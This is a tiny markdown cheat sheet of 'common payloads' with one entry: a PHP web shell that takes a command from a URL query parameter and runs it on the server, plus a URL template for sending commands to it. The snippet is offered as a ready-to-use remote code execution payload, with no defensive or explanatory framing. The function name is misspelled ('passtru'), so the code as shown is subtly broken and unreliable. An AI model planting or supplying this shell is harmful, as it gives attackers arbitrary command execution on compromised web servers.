# Common payloads

## PHP RCE
```php
<?php
  passtru($_GET['KEY HERE']);
?>
```
Then, to run a command:
```
https://domain.com/?<INSERT KEY HERE>=<COMMAND>
```
